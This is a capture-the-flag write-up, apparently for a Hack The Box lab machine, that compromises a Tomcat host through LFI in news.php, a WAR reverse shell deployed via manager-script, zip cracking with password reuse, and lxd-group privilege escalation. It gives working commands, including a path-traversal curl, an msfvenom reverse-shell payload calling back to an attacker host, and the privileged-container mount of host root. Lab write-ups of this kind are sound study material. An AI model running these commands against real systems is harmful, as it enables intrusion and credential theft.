# Tabby — Easy — Linux

**Date:** 1 July 2026

---

## Tags

`#linux` `#web` `#lfi` `#tomcat` `#manager-script` `#war-shell` `#zip-cracking` `#password-reuse` `#lxd` `#privesc`

---

## What I Know

|Item|Detail|
|---|---|
|Target|megahosting.htb (10.129.25.24)|
|OS|Linux (Ubuntu)|
|Open ports|22 (SSH), 80 (HTTP), 8080 (HTTP)|
|Services|OpenSSH 8.2p1; Apache 2.4.41 (80); Apache Tomcat (8080)|
|Foothold|LFI (news.php) → tomcat-users.xml creds → WAR deploy via manager-script|
|Users|tomcat → ash → root|
|Privesc|zip crack + password reuse (ash); lxd group → privileged container → root|

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.25.24

Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-01 13:50 +0100
Nmap scan report for 10.129.25.24
Host is up (0.057s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 22.45 seconds
```

<img width="917" height="331" alt="image" src="https://github.com/user-attachments/assets/fca65cb9-3fcc-4d90-86c1-9e8f02f49b8e" />

```
nmap -sC -sV -p22,80,8080 10.129.25.24

Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-01 13:50 +0100
Nmap scan report for 10.129.25.24
Host is up (0.017s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat (language: en)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.33 seconds
```

<img width="1210" height="493" alt="image" src="https://github.com/user-attachments/assets/b3359830-e043-42e5-b345-0037f427577b" />

**What each port tells me:**

- **Port 22 (SSH)** — OpenSSH 8.2p1 on Ubuntu. Open, but I have no credentials yet, a target to return to once I find some.
- **Port 80 (HTTP)** — Apache 2.4.41, the MegaHosting site. A custom app here is a likely source of a web bug (LFI/traversal).
- **Port 8080 (HTTP)** — Apache Tomcat. Tomcat's manager is a classic WAR-deploy-to-shell path if I can get credentials so 80 and 8080 probably chain together.

---

## Enumeration Log

```
OBSERVATION: Port 22 is open
WHAT IT TELLS ME: We can SSH into the server
WHAT I AM GOING TO TRY: Keep it aside
WHY: I don't have credentials
RESULT: N/A
WHAT NEXT:
- Investigate the port 80 web app
- Directory-fuzz for hidden paths
- Read the page source code
- Identify the tech stack
```

```
OBSERVATION:
- The port-80 app is a hosting-company site with one extra page, "news"
- No obvious hidden directories, and nothing notable in source or stack
- news.php takes a "file" parameter if it's used to include files, it may be vulnerable to LFI
WHAT IT TELLS ME: news.php?file= is a candidate for Local File Inclusion / path traversal
WHAT I AM GOING TO TRY: Test http://megahosting.htb/news.php?file= for LFI (e.g. read /etc/passwd)
WHY: To see whether I can read arbitrary internal files
RESULT:
- I could read /etc/passwd via the file parameter, confirmed LFI. But I had no concrete
  high-value file target yet
WHAT NEXT:
- Investigate the port-8080 Tomcat app; it may give a concrete file worth reading via LFI
```

> **Note:** the site is served on the `megahosting.htb` vhost, so this needs adding to `/etc/hosts` (`10.129.25.24 megahosting.htb`) before news.php resolves.

<img width="2560" height="719" alt="image" src="https://github.com/user-attachments/assets/5067d0db-0ace-4d86-b5f4-db606bddf4b6" />

<img width="1729" height="468" alt="image" src="https://github.com/user-attachments/assets/19955cc3-c824-4584-b3a3-b1c9604913ad" />

<img width="512" height="566" alt="image" src="https://github.com/user-attachments/assets/67dc10ff-b8d9-410f-b8cb-1de76bfe0605" />

<img width="2098" height="1056" alt="image" src="https://github.com/user-attachments/assets/4a1dcefe-d766-4dc7-ba1e-42ab48ae3813" />

```
OBSERVATION:
- /etc/passwd shows only two users with interactive shells (/bin/bash): root and ash
- Port 8080 is a default Tomcat page; its note says the manager webapp requires the "manager-gui"
  role and that users are defined in /etc/tomcat9/tomcat-users.xml
- Nothing in source, stack, or hidden dirs
WHAT IT TELLS ME:
- To reach the Tomcat manager I need credentials, which live in tomcat-users.xml
- I can chain the LFI to read that file and recover the creds
WHAT I AM GOING TO TRY:
- Try default Tomcat creds against the manager
- Use the LFI to read tomcat-users.xml
WHY: To get manager access (default creds or the real ones from the file)
RESULT:
- Default creds don't work
- LFI on /etc/tomcat9/tomcat-users.xml returned nothing (wrong path for this install)
- After researching Tomcat file locations HackTricks and matching the port-8080 install, the working
  path was /usr/share/tomcat9/etc/tomcat-users.xml. reading it via LFI gave a set of credentials
- Those creds do NOT have the manager-gui (UI) role, but they DO have the manager-script role
WHAT NEXT:
- manager-script still allows RCE via the text/CLI interface, research how to deploy through it
```
> **Note:** the HackTricks URL is https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html.

<img width="2002" height="604" alt="image" src="https://github.com/user-attachments/assets/047b4396-a4f5-4469-a180-4a3a86df9a67" />

<img width="2091" height="1009" alt="image" src="https://github.com/user-attachments/assets/b26f814a-ec7f-457f-9c2c-6270babd059d" />

<img width="1188" height="193" alt="image" src="https://github.com/user-attachments/assets/8379b318-e841-45ca-ba5d-58bab65cc7cd" />

```
OBSERVATION: The manager-script role exposes the /manager/text CLI, which can deploy WAR apps
WHAT IT TELLS ME: I can deploy a .war reverse shell through the text interface and trigger it, no GUI is needed
WHAT I AM GOING TO TRY:
- Build a .war reverse-shell payload
- Deploy it via /manager/text using the recovered creds, then browse to it
WHY: To get a foothold
RESULT: Deployed the WAR, triggered it, and got a reverse shell as the tomcat user
WHAT NEXT: Enumerate the system and read user.txt
```

<img width="1166" height="331" alt="image" src="https://github.com/user-attachments/assets/bde8ff2d-8c36-4ac6-9f7e-86f1572d0e67" />

<img width="1571" height="819" alt="image" src="https://github.com/user-attachments/assets/6d6b1cd2-c1bd-4f3a-86fd-42cd8143a418" />

<img width="1188" height="585" alt="image" src="https://github.com/user-attachments/assets/283f30ff-ab51-4093-945c-02bbd9374de3" />

<img width="873" height="201" alt="image" src="https://github.com/user-attachments/assets/0be7ede4-5432-4ade-ad73-aad1e78e124c" />

```
OBSERVATION: In /home there's a user "ash", but tomcat can't access ash's files (so no user.txt yet)
WHAT IT TELLS ME: I need to move laterally to ash
WHAT I AM GOING TO TRY: Enumerate the filesystem for credentials/sensitive data
WHY: Another user exists and I have no password for them; becoming ash is the next logical step
RESULT: Found a password-protected archive, 16162020_backup.zip, in /var/www/html/files
WHAT NEXT:
- Try the earlier Tomcat password on the zip; if it fails, exfiltrate it and crack with john
```

<img width="934" height="511" alt="image" src="https://github.com/user-attachments/assets/072c70dc-70c9-431a-b1b9-e1579b32f397" />

<img width="587" height="128" alt="image" src="https://github.com/user-attachments/assets/30cbea16-ac73-4f66-89bd-818e1b478fe8" />

<img width="868" height="167" alt="image" src="https://github.com/user-attachments/assets/f89e8572-d79b-4a14-9991-da1645aab21d" />


```
OBSERVATION: The earlier password didn't open the zip, but john cracked it and I unzipped 16162020_backup.zip
WHAT IT TELLS ME: The cracked zip password might be reused, and/or the archive contents may hold secrets
WHAT I AM GOING TO TRY:
- Reuse the cracked password as ash's system password
- Inspect the extracted files for anything useful
WHY:
- Password reuse is common, if ash set the zip password, it may match their login
- A "backup" archive is a plausible place for credentials
RESULT: The cracked zip password worked directly as ash's password. Logged in as ash and read user.txt
WHAT NEXT: Enumerate as ash for a path to root
```

<img width="790" height="159" alt="image" src="https://github.com/user-attachments/assets/7f9b8788-b8e7-4f29-aff9-37d317058df8" />

<img width="1067" height="79" alt="image" src="https://github.com/user-attachments/assets/2195f6e1-3464-4e70-a554-3e7a3a450a6e" />

<img width="2515" height="1050" alt="image" src="https://github.com/user-attachments/assets/879f2b5c-3e6b-407e-81e4-fd2ba7c50451" />

<img width="1260" height="649" alt="image" src="https://github.com/user-attachments/assets/b9e9d8ed-e031-43a1-84f6-c8f1e4ec15b6" />

<img width="608" height="162" alt="image" src="https://github.com/user-attachments/assets/083644b5-7dfa-443e-9bfe-85ba00f6d82e" />

```
OBSERVATION: ash is a member of the "lxd" group
WHAT IT TELLS ME: The lxd group (Ubuntu's container manager, similar to docker) is a well-known privesc, 
  a member can launch a privileged container that mounts the host filesystem as root
WHAT I AM GOING TO TRY: Use the standard lxd privesc (import a small Alpine image, create a
  privileged container, mount host / into it)
WHY: It's a known, reliable root vector for lxd-group members
RESULT:
- lxc here is provided via snap, which is sandboxed, so the image files (incus/lxd.tar.xz and
  rootfs.squashfs) had to be placed under ash's home directory for the snap-confined lxc to read them
- Built/imported the image, created a privileged container mounting host / at /mnt/root, and read
  root.txt (and root's SSH key) from the mounted filesystem
```

<img width="1110" height="970" alt="image" src="https://github.com/user-attachments/assets/07e232e7-537e-4af2-bf42-dd64080cbb0a" />

<img width="1144" height="915" alt="image" src="https://github.com/user-attachments/assets/cd69d98d-2977-46c8-b59a-41dccee2e713" />

<img width="1544" height="1124" alt="image" src="https://github.com/user-attachments/assets/c2613511-bbe9-4f5e-a4fc-ff3be46d6b63" />

<img width="2160" height="608" alt="image" src="https://github.com/user-attachments/assets/93af7b74-b19e-4aba-8e97-bd1afa6644e7" />

<img width="1414" height="738" alt="image" src="https://github.com/user-attachments/assets/68fbd39a-0fbb-4c9c-bd50-7bf57f5c50db" />

<img width="1170" height="556" alt="image" src="https://github.com/user-attachments/assets/0f9d6337-ff07-4554-ac7e-b973b51f814f" />

<img width="1698" height="803" alt="image" src="https://github.com/user-attachments/assets/cde2c469-2a36-4547-a0de-13bb65ade15f" />


---

## Foothold

**How I got in:** The MegaHosting site on port 80 had an LFI in `news.php?file=`, confirmed by reading `/etc/passwd`. Tomcat on 8080 stores its credentials in `tomcat-users.xml`; the default `/etc/tomcat9/...` path failed, but the install here kept it at `/usr/share/tomcat9/etc/tomcat-users.xml`, which the LFI read successfully. The recovered account lacked the `manager-gui` (UI) role but had **`manager-script`**, which still allows deploying apps through the `/manager/text` CLI. I deployed a WAR reverse shell that way and triggered it for a shell as **tomcat**.

**Command / exploit used:**

```
echo "10.129.25.24  megahosting.htb" | sudo tee -a /etc/hosts

# read tomcat creds via LFI
curl "http://megahosting.htb/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml"

# build a WAR reverse shell and deploy through the text interface
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
curl -u 'tomcat:<password>' --upload-file shell.war \
  "http://megahosting.htb:8080/manager/text/deploy?path=/shell"
# trigger it
curl "http://megahosting.htb:8080/shell/"      # → shell as tomcat  (nc -lnvp <LPORT>)
```

**Why it worked:** Two web weaknesses chained. The custom `news.php` included a user-controlled file path with no sanitisation (LFI), and Tomcat's credentials sat in a world-readable config file whose location I could infer from the OS/version. The `manager-script` role is often overlooked because it has no GUI, but it grants the same deploy-a-WAR code-execution as the GUI role.

---

## Privilege Escalation

**Path taken (tomcat → ash → root):**

1. **Lateral move via a cracked backup zip.** `/var/www/html/files/16162020_backup.zip` was password-protected. I exfiltrated it, cracked the password with john, and because the same password was reused, i was able to log straight in as **ash** and read user.txt. (The archive contents themselves were a decoy; the value was the reused password.)
2. **Root via the lxd group.** `id` showed ash in the **lxd** group. LXD's Unix socket doesn't restrict a group member's privileges, so I could create a **privileged** container and mount the host's root filesystem inside it. One wrinkle: `lxc` here is a **snap** package and therefore sandboxed, so the image files (`incus/lxd.tar.xz` + `rootfs.squashfs`) had to live under ash's home directory for the confined `lxc` to read them. I imported the image, created a privileged container with host `/` mounted at `/mnt/root`, and read `root.txt` directly.

```
# attacker: build a small alpine image
git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder
sudo ./build-alpine
# transfer the .tar.gz into ash's HOME (snap sandbox requires it there), then:
lxc image import ./alpine*.tar.gz --alias privesc
lxc init privesc r00t -c security.privileged=true
lxc config device add r00t host disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
# → /mnt/root is the host filesystem as root; read /mnt/root/root/root.txt
```

**Why it worked:** Two failures. First, password reuse of the zip and ash's login password, so cracking one gave the other. Second, and the real root cause, membership in the `lxd` group is effectively root-equivalent: LXD lets group members run privileged containers, and mounting the host filesystem into a container you control hands you every file on the box, root's included. The snap sandbox only changed _where_ the image files had to sit, not whether the attack worked.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Chained an LFI in news.php to read Tomcat's `tomcat-users.xml` (at the non-default `/usr/share/tomcat9/...` path), then used the `manager-script` role to deploy a WAR reverse shell as tomcat.
2. **Privesc technique in one sentence:** Cracked a backup zip and reused its password to become ash, then abused ash's `lxd` group membership to mount the host filesystem in a privileged container and read root's files.
